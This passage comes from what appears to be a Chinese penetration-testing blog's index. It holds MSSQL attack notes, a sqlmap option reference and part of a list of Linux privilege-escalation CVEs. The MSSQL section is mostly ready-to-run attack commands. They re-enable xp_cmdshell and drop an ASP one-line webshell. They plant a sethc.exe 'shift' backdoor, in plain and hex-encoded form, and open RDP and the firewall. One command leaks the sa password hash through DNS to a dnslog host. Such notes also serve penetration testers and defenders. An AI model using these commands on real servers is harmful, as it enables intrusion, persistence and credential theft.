#所有用户表</li><li>-xtype=’S’ #所有系统表</li><li>select * from sysobjects where xtype=’U’; #查看当前数据库的所有表名</li><li>select name from XXX..sysobjects where xtype=’U’; #查看当前XXX数据库的所有表名</li><li>select name from syscolumns where id=object_id(‘xxx’); #查看xxx表下的所有列</li></ol><h2 id="0x12-xp-cmdshell执行系统命令"><a href="#0x12-xp-cmdshell执行系统命令" class="headerlink" title="0x12 xp_cmdshell执行系统命令"></a>0x12 xp_cmdshell执行系统命令</h2><ol><li>select COUNT(*) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’; #判断是否存在xp_cmdshell扩展存储过程，存在即返回1</li><li>select * from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’; #查看xp_cmdshell状态</li><li><img src="/SqlServer/1.png" alt></li><li>Exec master..xp_cmdshell ‘whoami’; #直接执行系统命令</li><li>Exec master.dbo.xp_cmdshell ‘ipconfig’; #直接执行系统命令</li><li><code>消息 15281，级别 16，状态 1，过程 xp_cmdshell，第 1 行</code></li><li><code>SQL Server 阻止了对组件 &#39;xp_cmdshell&#39; 的 过程 &#39;sys.xp_cmdshell&#39; 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 &#39;xp_cmdshell&#39;。有关启用 &#39;xp_cmdshell&#39; 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。</code></li><li><strong>修复扩展存储过程</strong></li><li>exec sp_configure ‘show advanced options’,1; #允许修改高级参数，即 0 改为 1</li><li>reconfigure; #安装</li><li>exec sp_configure ‘xp_cmdshell’,1; #打开xp_cmdshell扩展，即 0 改为 1</li><li>reconfigure; #安装</li><li>exec master..xp_cmdshell ‘whoami’; #再执行命令</li><li><strong>一行命令：</strong><code>exec sp_configure &#39;show advanced options&#39;,1;reconfigure;exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;exec master..xp_cmdshell &#39;whoami&#39;</code></li><li><strong>若已删则添加</strong></li><li><strong>第一种：</strong></li><li><code>Exec master.dbo.sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;D:\\xplog70.dll&#39;</code></li><li><strong>第二种：</strong></li><li><code>exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.dll&#39; declare @o int;</code></li><li><code>sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;xplog70.dll&#39;;</code></li></ol><p><strong>写入一句话</strong></p><ol><li>exec master..xp_cmdshell ‘echo ^&lt;%eval request(“pass”)%^&gt;&gt;c:\update.asp’– #xp_cmdshell写入文件</li><li>exec master..xp_cmdshell ‘type c:\update.asp’– #type查看文件</li></ol><h2 id="0x13-禁用xp-cmdshell"><a href="#0x13-禁用xp-cmdshell" class="headerlink" title="0x13 禁用xp_cmdshell"></a>0x13 禁用xp_cmdshell</h2><ol start="6"><li><strong>卸载存储过程xp_cmdshell</strong></li><li>exec sp_configure ‘show advanced options’,1;</li><li>reconfigure;</li><li>exec sp_configure ‘xp_cmdshell’,0;</li><li>reconfigure;</li><li><strong>彻底删除存储过程xp_cmdshell</strong></li><li>搜索本地xplog70.dll，删除它。</li></ol><h2 id="0x20-COM组件利用"><a href="#0x20-COM组件利用" class="headerlink" title="0x20 COM组件利用"></a>0x20 COM组件利用</h2><ol><li>条件：</li><li><ul><li>mssql未降权</li></ul></li><li><ul><li>获取数据库用户名密码</li></ul></li><li></li><li>select * from master.dbo.sysobjects where xtype=’x’ and name=’SP_OACREATE’ #查看SP_OACREATE状态</li><li>select count(*) from master.dbo.sysobjects where xtype=’x’ and name=’SP_OACREATE’ #判断SP_OACREATE是否存在，存在返回1</li><li>EXEC sp_configure ‘show advanced options’, 1;   </li><li>RECONFIGURE WITH OVERRIDE;   </li><li>EXEC sp_configure ‘Ole Automation Procedures’, 1;   </li><li>RECONFIGURE WITH OVERRIDE;</li><li>执行系统命令：</li><li>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:\windows\system32\cmd.exe /c whoami &gt;c:\1.txt’ #无回显</li></ol><h2 id="0x30-常用语句"><a href="#0x30-常用语句" class="headerlink" title="0x30 常用语句"></a>0x30 常用语句</h2><p><strong>是否开启远程桌面，1：关闭，0：开启</strong></p><ol><li>exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’</li><li><img src="/SqlServer/2.png" alt></li></ol><p><strong>读取远程桌面端口</strong></p><ol><li>exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp’,’PortNumber’</li><li><img src="/SqlServer/3.png" alt></li></ol><p><strong>开启远程桌面</strong></p><ol><li>exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;</li></ol><p><strong>reg文件开启远程桌面</strong></p><pre><code>echo Windows Registry Editor Version 5.00&gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.regecho &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.regecho &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</code></pre><ol><li>执行：regedit /s 3389.reg</li></ol><p><strong>第一次开启远程桌面可能需要防火墙允许</strong></p><ol><li>netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</li></ol><p><strong>关闭远程桌面</strong></p><ol><li>exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,1;</li></ol><p><strong>写入shift后门</strong></p><pre><code>exec xp_regwrite&#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;debugger&#39;,&#39;REG_SZ&#39;,&#39;c:\\windows\\system32\\taskmgr.exe&#39;</code></pre><p><strong>写入shift后门（16进制编码）</strong></p><pre><code>exec xp_regwrite0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,&#39;c:\\windows\\system32\\taskmgr.exe&#39;--</code></pre><pre><code>DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=&#39;sa&#39;)+&#39;.ip.port.dnslog&#39;;EXEC(&#39;master..xp_dirtree &quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;);</code></pre><h2 id="0x40-CLR利用"><a href="#0x40-CLR利用" class="headerlink" title="0x40 CLR利用"></a>0x40 CLR利用</h2><ol><li><a href="https://xz.aliyun.com/t/7534" target="_blank" rel="noopener">https://xz.aliyun.com/t/7534</a></li></ol><h2 id="0xF0-参考"><a href="#0xF0-参考" class="headerlink" title="0xF0 参考"></a>0xF0 参考</h2><ol><li><a href="https://xz.aliyun.com/t/7534" target="_blank" rel="noopener">https://xz.aliyun.com/t/7534</a></li><li><a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit" target="_blank" rel="noopener">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> mssql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap</title>
      <link href="/Sqlmap/"/>
      <url>/Sqlmap/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Sqlmap"><a href="#0x00-Sqlmap" class="headerlink" title="0x00 Sqlmap"></a>0x00 Sqlmap</h2><ol><li>一款用来检测与利用SQL注入漏洞的免费开源工具。</li></ol><h2 id="0x10-sqlmap-参数-os-shell"><a href="#0x10-sqlmap-参数-os-shell" class="headerlink" title="0x10 sqlmap 参数--os-shell"></a>0x10 sqlmap 参数<code>--os-shell</code></h2><ol><li><p><strong>mysql</strong></p></li><li><p>写入权限</p></li><li><p>show variables like “%secure%”; #值为空白或某路径，不是NULL</p></li><li><p>获得网站路径或部分路径</p></li><li><p><img src="/Sqlmap/1.png" alt></p></li><li><p>sqlmap -d “mysql://uset:password@ip:port/dbname” –os-shell</p></li><li><p><strong>mssql</strong></p></li><li><p>sqlmap -d “mssql://uset:password@ip:port/dbname”</p></li><li><p>pip install pymssql #需要pymssql模块</p></li><li><p>步骤：</p></li><li><p>识别当前数据库，然后输出；</p></li><li><p>检测是否为dba，即是否有sa权限；</p></li><li><p>检测是否开启了xp_cmdshell，没有开启sqlmap就会尝试开启。</p></li><li><p>手动开启：使用其他工具启动或恢复xp_cmdshell</p></li><li><p>select IS_SRVROLEMEMBER(‘sysadmin’)； #查看是否dba</p></li><li><p>select count(*) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’; #查看是否为sa</p></li></ol><h2 id="0xF0-选项"><a href="#0xF0-选项" class="headerlink" title="0xF0 选项"></a>0xF0 选项</h2><ol><li><code>-h #查看帮助</code></li><li><code>-hh #查看详细帮助</code></li><li><code>--version #版本</code></li><li><code>-v [0-6，默认1] #详细级别</code></li></ol><h2 id="0xF1-目标"><a href="#0xF1-目标" class="headerlink" title="0xF1 目标"></a>0xF1 目标</h2><ol><li><code>-d #直连数据库</code></li><li><code>sqlmap -d &quot;mysql://root:root@127.0.0.1:3306/mysql&quot; --os-shell</code></li><li><code>-u,--url</code></li><li><code>-u &quot;http://test.com/index.php?id=1&quot;</code></li><li><code>--url=&quot;http://test.com/index.php?id=1&quot;</code></li><li><code>-l *.log #burp或webscarab等的代理日志文件</code></li><li><code>-x *.xml #远程站点地图文件（sitemap.xml）</code></li><li><code>-m *.txt #从txt文件中解析多目标，如：-u只针对一个URL，把多个URL放在txt文件中，使用-m</code></li><li><code>-r [请求文件] #多用于POST请求注入，如：请求数据包保存为txt文件</code></li><li><code>-g &quot;inurl:\&quot;.php?id=1\&quot;&quot; #扫描搜索引擎搜索到的URL</code></li><li><code>-c *.ini #从配置文件中加载</code></li></ol><h2 id="0xF2-请求：这些选项可以用来指定如何连接到目标URL。"><a href="#0xF2-请求：这些选项可以用来指定如何连接到目标URL。" class="headerlink" title="0xF2 请求：这些选项可以用来指定如何连接到目标URL。"></a>0xF2 请求：这些选项可以用来指定如何连接到目标URL。</h2><ol><li><code>--method=请求方法 #指定请求方法，如：PUT</code></li><li><code>--data=DATA #POST发送的数据</code></li><li><code>--param-del=字符 #分割参数值的字符</code></li><li><code>--data &quot;name=abc;id=1&quot; --param-del=&quot;;&quot;</code></li><li><code>--cookie=COOKIE #cookie注入</code></li><li><code>--cookie-del=字符 ##分割cookie值的字符</code></li><li><code>--load-cookies=L.. #包含Netscape/wget格式的cookie的文件</code></li><li><code>--drop-set-cookie #忽略响应头中的set-cookie</code></li><li><code>--user-agent=AGENT #指定HTTP user-agent头值</code></li><li><code>--random-agent #使用随机UA头</code></li><li><code>--host=HOST #指定HOST头值</code></li><li><code>--referer=REFERER #指定referer头值</code></li><li><code>-H HEADER #如：-H &quot;X-Forwarded-For: 127.0.0.1&quot;</code></li><li><code>--headers=HEADERS #如：--headers=&quot;Accept-Language: fr\nETag: 123&quot;</code></li><li><code>--auth-type=AUTH.. #HTTP身份认证类型（basic,digest,NTLM or PKI）</code></li><li><code>--auth-cred=AUTH.. #HTTP认证凭证（name:password）</code></li><li><code>--auth-file=AUTH.. #HTTP认证 PEM认证/私钥文件</code></li><li><code>--ignore-401 #忽视401错误</code></li><li><code>--proxy=PROXY #使用代理连接目标网址</code></li><li><code>--proxy-cred=PRO.. #代理认证证书（name:password）</code></li><li><code>--proxy-file=PRO.. #从文件中加载代理列表</code></li><li><code>--ignore-proxy #忽略系统默认代理设置</code></li><li><code>--tor #使用Tor匿名网络</code></li><li><code>--tor-port=TORPORT #设置Tor代理端口</code></li><li><code>--tor-type=TORTYPE #设置Tor代理类型</code></li><li><code>--check-tor #检查Tor是否正常使用</code></li><li><code>--delay=DELAY #设置每个http请求之间的延迟（秒）</code></li><li><code>--timeout=TIMEOUT #连接超时等待时间（默认30秒）</code></li><li><code>--retries=RETRIES #连接超时时重试（默认3次）</code></li><li><code>--randomize=PRARAM #随机更改给定参数的值</code></li><li><code>--safe-url=SAFEURL #测试期间频繁访问的URL地址，有的web应用程序在多次访问错误的请求后屏蔽以后的所有请求</code></li><li><code>--safe-post=SAFE.. #POST数据发送到安全URL</code></li><li><code>--safe-req=SAFE.. #从文件加载安全HTTP请求</code></li><li><code>--safe-freq=SAFE.. #在两次访问给定安全网址之间测试请求</code></li><li><code>--skip-urlencode #跳过有效载荷的URL编码</code></li><li><code>--csrf-token=CSR.. #保持anti-CSRF token</code></li><li><code>--csrf-url=CSRFURL #提取anti-CSRF URL地址访问令牌</code></li><li><code>--force-ssl #强制使用SSL /HTTPS</code></li><li><code>--hpp #使用HTTP参数pollution的方法</code></li><li><code>--eval=EVALCODE #Evaluate provided Python code before the request (e.g.&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</code></li></ol><h2 id="0xF3-优化：这些选项可用于优化sqlmap的性能。"><a href="#0xF3-优化：这些选项可用于优化sqlmap的性能。" class="headerlink" title="0xF3 优化：这些选项可用于优化sqlmap的性能。"></a>0xF3 优化：这些选项可用于优化sqlmap的性能。</h2><ol><li><code>-o #开启所有优化开关</code></li><li><code>--predict-output #预测常见的查询输出</code></li><li><code>--keep-alive #使用持久化的HTTP(S)连接</code></li><li><code>--null-connection #从没有实际的HTTP响应体中检索页面长度</code></li><li><code>--threads=线程 #最大的HTTP（S）请求并发量（默认为1）</code></li></ol><h2 id="0xF4-注入：这些选项可以用来指定测试哪些参数，提供自定义的注入payloads和可选篡改脚本。"><a href="#0xF4-注入：这些选项可以用来指定测试哪些参数，提供自定义的注入payloads和可选篡改脚本。" class="headerlink" title="0xF4 注入：这些选项可以用来指定测试哪些参数，提供自定义的注入payloads和可选篡改脚本。"></a>0xF4 注入：这些选项可以用来指定测试哪些参数，提供自定义的注入payloads和可选篡改脚本。</h2><ol><li><code>-p #可测试的参数</code></li><li><code>--skip=SKIP #跳过对给定参数的测试</code></li><li><code>--skip-static #跳过测试不显示为动态的参数</code></li><li><code>--param-exclude=.. #使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）</code></li><li><code>--dbms=DBMS #指定数据库（MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2）</code></li><li><code>--dbms-cred=DBMS #DBMS认证凭证（user:password）</code></li><li><code>--os=OS #指定数据库服务器系统（Linux、Windows）</code></li><li><code>--invalid-bignum #使用大数字使值无效</code></li><li><code>--invalid-logical #使用逻辑操作使值无效</code></li><li><code>--invalid-string #使用随机字符串使值无效</code></li><li><code>--no-cast #默认情况下，sqlmap榨取数据时会将所有结果转换为字符串，并用空格替换NULL结果</code></li><li><code>--no-escape #关闭字符串转义机制</code></li><li><code>--prefix=PREFIX #注入payload字符串前缀</code></li><li><code>--suffix=SUFFIX #注入payload字符串后缀</code></li><li><code>--tamper=TAMPER #使用给定的脚本（S）篡改注入数据</code></li></ol><h2 id="0xF5-检测：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。"><a href="#0xF5-检测：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。" class="headerlink" title="0xF5 检测：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。"></a>0xF5 检测：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</h2><ol><li><code>--level=LEVEL #执行测试的等级（1-5，默认为1）</code></li><li><code>--risk=RISK #执行测试的风险（0-3，默认为1）</code></li><li><code>--string=STRING #查询时有效时在页面匹配字符串</code></li><li><code>--not-string=NOT.. #当查询求值为无效时匹配的字符串</code></li><li><code>--regexp=REGEXP #查询时有效时在页面匹配正则表达式</code></li><li><code>--code=CODE #当查询求值为True时匹配的HTTP代码</code></li><li><code>--text-only #仅基于在文本内容比较网页</code></li><li><code>--titles #仅根据他们的标题进行比较</code></li></ol><h2 id="0xF6-技巧：这些选项可用于调整具体的SQL注入测试。"><a href="#0xF6-技巧：这些选项可用于调整具体的SQL注入测试。" class="headerlink" title="0xF6 技巧：这些选项可用于调整具体的SQL注入测试。"></a>0xF6 技巧：这些选项可用于调整具体的SQL注入测试。</h2><ol><li><code>--technique=TECH #SQL 注入技术测试（默认BEUSTQ）</code></li><li><code>--time-sec=TIMESEC #DBMS响应的延迟时间（默认为5秒）</code></li><li><code>--union-cols=UCOLS #定列范围用于测试UNION查询注入</code></li><li><code>--union-char=UCHAR #用于暴力猜解列数的字符</code></li><li><code>--union-from=UFROM #要在UNION查询SQL注入的FROM部分使用的表</code></li><li><code>--dns-domain=DNS.. #域名用于DNS漏出攻击</code></li><li><code>--second-order=S.. #生成页面的URL搜索为second-order响应</code></li></ol><h2 id="0xF7-指纹"><a href="#0xF7-指纹" class="headerlink" title="0xF7 指纹"></a>0xF7 指纹</h2><ol><li><code>-f，--fingerprint #执行检查广泛的DBMS版本指纹</code></li></ol><h2 id="0xF8-枚举：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。"><a href="#0xF8-枚举：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。" class="headerlink" title="0xF8 枚举：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。"></a>0xF8 枚举：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</h2><ol><li><code>-a，--all #检索一切</code></li><li><code>-b，--banner #检索数据库管理系统的指纹</code></li><li><code>--current-user #当前用户</code></li><li><code>--current-db #当前数据库</code></li><li><code>--hostname #检索数据库服务器的主机名</code></li><li><code>--is-dba #检测DBMS当前用户是否DBA</code></li><li><code>--users #枚举数据库管理系统用户</code></li><li><code>--passwords #枚举数据库管理系统用户密码哈希</code></li><li><code>--privileges #枚举数据库管理系统用户的权限</code></li><li><code>--roles #枚举数据库管理系统用户的角色</code></li><li><code>--dbs #枚举数据库管理系统数据库</code></li><li><code>--tables #枚举的DBMS数据库中的表</code></li><li><code>--columns #枚举DBMS数据库表列</code></li><li><code>--schema #枚举数据库架构</code></li><li><code>--count #检索表的条目数</code></li><li><code>--dump #转储数据库管理系统的数据库中的表项</code></li><li><code>--dump-all #转储数据库管理系统的数据库中的表项</code></li><li><code>--search #搜索列（S），表（S）和/或数据库名称（S）</code></li><li><code>--comments #检索数据库的comments(注释、评论)</code></li><li><code>-D DB #要进行枚举的数据库名</code></li><li><code>-T TBL #要进行枚举的数据库表</code></li><li><code>-C COL #要进行枚举的数据库列</code></li><li><code>-X EXCLUDECOL #不进行枚举的数据库列</code></li><li><code>-U USER #用来进行枚举的数据库用户</code></li><li><code>--exclude-sysdbs #枚举表时排除系统数据库</code></li><li><code>--pivot-column=P.. #主列名称</code></li><li><code>--where=DUMPWHERE #使用WHERE条件进行表转储</code></li><li><code>--start=LIMITSTART #第一个查询输出进入检索</code></li><li><code>--stop=LIMITSTOP #最后查询的输出进入检索</code></li><li><code>--first=FIRSTCHAR #第一个查询输出字的字符检索</code></li><li><code>--last=LASTCHAR #最后查询的输出字字符检索</code></li><li><code>--sql-query=QUERY #要执行的SQL语句</code></li><li><code>--sql-shell #提示交互式SQL的shell</code></li><li><code>--sql-file=SQLFILE #从给定文件执行SQL语句</code></li></ol><h2 id="0xF9-蛮力：这些选项可以被用来运行蛮力检查。"><a href="#0xF9-蛮力：这些选项可以被用来运行蛮力检查。" class="headerlink" title="0xF9 蛮力：这些选项可以被用来运行蛮力检查。"></a>0xF9 蛮力：这些选项可以被用来运行蛮力检查。</h2><ol><li><code>--common-tables #检查存在共同表</code></li><li><code>--common-columns #检查存在共同列</code></li></ol><h2 id="0xFA-用户自定义函数注入：这些选项可以用来创建用户自定义函数。"><a href="#0xFA-用户自定义函数注入：这些选项可以用来创建用户自定义函数。" class="headerlink" title="0xFA 用户自定义函数注入：这些选项可以用来创建用户自定义函数。"></a>0xFA 用户自定义函数注入：这些选项可以用来创建用户自定义函数。</h2><ol><li><code>--udf-inject #注入用户自定义函数</code></li><li><code>--shared-lib=SHLIB #共享库的本地路径</code></li></ol><h2 id="0xFB-访问文件系统：这些选项可以被用来访问后端数据库管理系统的底层文件系统。"><a href="#0xFB-访问文件系统：这些选项可以被用来访问后端数据库管理系统的底层文件系统。" class="headerlink" title="0xFB 访问文件系统：这些选项可以被用来访问后端数据库管理系统的底层文件系统。"></a>0xFB 访问文件系统：这些选项可以被用来访问后端数据库管理系统的底层文件系统。</h2><ol><li><code>--file-read=RFILE #从后端的数据库管理系统文件系统读取文件</code></li><li><code>--file-write=WFILE #编辑后端的数据库管理系统文件系统上的本地文件</code></li><li><code>--file-dest=DFILE #后端的数据库管理系统写入文件的绝对路径</code></li></ol><h2 id="0xFC-操作系统访问：这些选项可以用于访问后端数据库管理系统的底层操作系统。"><a href="#0xFC-操作系统访问：这些选项可以用于访问后端数据库管理系统的底层操作系统。" class="headerlink" title="0xFC 操作系统访问：这些选项可以用于访问后端数据库管理系统的底层操作系统。"></a>0xFC 操作系统访问：这些选项可以用于访问后端数据库管理系统的底层操作系统。</h2><ol><li><code>--os-cmd=OSCMD #执行操作系统命令</code></li><li><code>--os-shell #交互式的操作系统的shell</code></li><li><code>--os-pwn #获取一个OOB shell，meterpreter或VNC</code></li><li><code>--os-smbrelay #一键获取一个OOB shell，meterpreter或VNC</code></li><li><code>--os-bof #存储过程缓冲区溢出利用</code></li><li><code>--priv-esc #数据库进程用户权限提升</code></li><li><code>--msf-path=MSFPATH #本地的安装路径</code></li><li><code>--tmp-path=TMPPATH #远程临时文件目录的绝对路径</code></li></ol><h2 id="0xFD-Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。"><a href="#0xFD-Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。" class="headerlink" title="0xFD Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。"></a>0xFD Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。</h2><ol><li><code>--reg-read #读一个Windows注册表项值</code></li><li><code>--reg-add #写一个Windows注册表项值数据</code></li><li><code>--reg-del #删除Windows注册表键值</code></li><li><code>--reg-key=REGKEY #Windows注册表键</code></li><li><code>--reg-value=REGVAL #Windows注册表项值</code></li><li><code>--reg-data=REGDATA #Windows注册表键值数据</code></li><li><code>--reg-type=REGTYPE #Windows注册表项值类型</code></li></ol><h2 id="0xFE-一般：这些选项可以用来设置一些一般的工作参数。"><a href="#0xFE-一般：这些选项可以用来设置一些一般的工作参数。" class="headerlink" title="0xFE 一般：这些选项可以用来设置一些一般的工作参数。"></a>0xFE 一般：这些选项可以用来设置一些一般的工作参数。</h2><ol><li><code>-s SESSIONFILE #保存和恢复检索会话文件的所有数据</code></li><li><code>-t TRAFFICFILE #记录所有HTTP流量到一个文本文件中</code></li><li><code>--batch #从不询问用户输入，使用所有默认配置。</code></li><li><code>--binary-fields=.. #具有二进制值的结果字段</code></li><li><code>--charset=CHARSET #强制用于数据检索的字符编码</code></li><li><code>--crawl=CRAWLDEPTH #从目标网址开始抓取网站</code></li><li><code>--crawl-exclude=.. #正则表达式排除网页抓取</code></li><li><code>--csv-del=CSVDEL #分隔CSV输出中使用的字符</code></li><li><code>--dump-format=DU.. #转储数据的格式</code></li><li><code>--eta #显示每个输出的预计到达时间</code></li><li><code>--flush-session #刷新当前目标的会话文件</code></li><li><code>--forms #在目标网址上解析和测试表单</code></li><li><code>--fresh-queries #忽略在会话文件中存储的查询结果</code></li><li><code>--hex #使用DBMS hex函数进行数据检索</code></li><li><code>--output-dir=OUT.. #自定义输出目录路径</code></li><li><code>--parse-errors #解析和显示响应中的DBMS错误消息</code></li><li><code>--save=SAVECONFIG #保存选项到INI配置文件</code></li><li><code>--scope=SCOPE #使用正则表达式从提供的代理日志中过滤目标</code></li><li><code>--test-filter=TE.. #根据有效负载和/或标题(e.g. ROW)选择测试</code></li><li><code>--test-skip=TEST.. #根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</code></li><li><code>--update #更新SqlMap</code></li></ol><h2 id="0xFF-杂项：使用简短的助记符"><a href="#0xFF-杂项：使用简短的助记符" class="headerlink" title="0xFF 杂项：使用简短的助记符"></a>0xFF 杂项：使用简短的助记符</h2><ol><li><code>--alert=ALERT #在找到SQL注入时运行主机操作系统命令</code></li><li><code>--answers=ANSWERS #设置问题答案</code></li><li><code>--beep #发现SQL 注入时提醒</code></li><li><code>--cleanup #具体的UDF和表清理DBMS</code></li><li><code>--dependencies #检查是否缺少（非内核）sqlmap依赖关系</code></li><li><code>--disable-coloring #禁用控制台输出颜色</code></li><li><code>--gpage=GOOGLEPAGE #使用Google dork结果指定页码</code></li><li><code>--identify-waf #对WAF / IPS / IDS保护进行全面测试</code></li><li><code>--skip-waf #跳过启发式检测WAF / IPS / IDS保护</code></li><li><code>--mobile #通过HTTP User-Agent标头模仿智能手机</code></li><li><code>--offline #在离线模式下工作（仅使用会话数据）</code></li><li><code>--page-rank #Google dork结果显示网页排名（PR）</code></li><li><code>--purge-output #安全地从输出目录中删除所有内容</code></li><li><code>--smart #只有在正启发式时才进行彻底测试</code></li><li><code>--sqlmap-shell #提示交互式 sqlmap shell</code></li><li><code>--wizard #给初级用户的简单向导界面</code></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之Linux</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Linux提权"><a href="#0x00-Linux提权" class="headerlink" title="0x00 Linux提权"></a>0x00 Linux提权</h2><ol><li><a href="#exp"><strong>EXP说明</strong></a></li><li><a href="#tools"><strong>常用脚本工具</strong></a></li></ol><h2 id="0x10-EXP说明"><a href="#0x10-EXP说明" class="headerlink" title="0x10 EXP说明"></a>0x10 <span id="exp"><a href="https://micro8.gitbook.io/micro8/contents-1/1-10/2linux-ti-quan-yi-lai-exp-pian" target="_blank" rel="noopener"><strong>EXP说明</strong></a></span></h2><pre><code>CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20)CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch]CVE-2017-7494 [Samba Remote execution] (Samba 3.5.0-4.6.4/4.5.10/4.4.14)CVE-2017-7308 [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)CVE-2017-6074 [a double-free in DCCP protocol] (Linux kernel through 4.9.11)CVE-2017-5123 [&#39;waitid()&#39;] (Kernel 4.14.0-rc4+)CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)CVE-2016-5195 [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007))CVE-2016-2384 [a double-free in USB MIDI driver]  (Linux kernel before 4.5)CVE-2016-0728 [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)CVE-2015-7547 [glibc getaddrinfo] (before Glibc 2.9)CVE-2015-1328 [overlayfs] (3.13, 3.16.0, 3.19.0)CVE-2014-5284 [OSSEC] (2.8)CVE-2014-4699 [ptrace] (before 3.15.4)CVE-2014-4014 [Local Privilege Escalation] (before 3.14.8)CVE-2014-3153 [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)CVE-2014-0196 [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)CVE-2014-0038 [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)CVE-2013-2094 [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 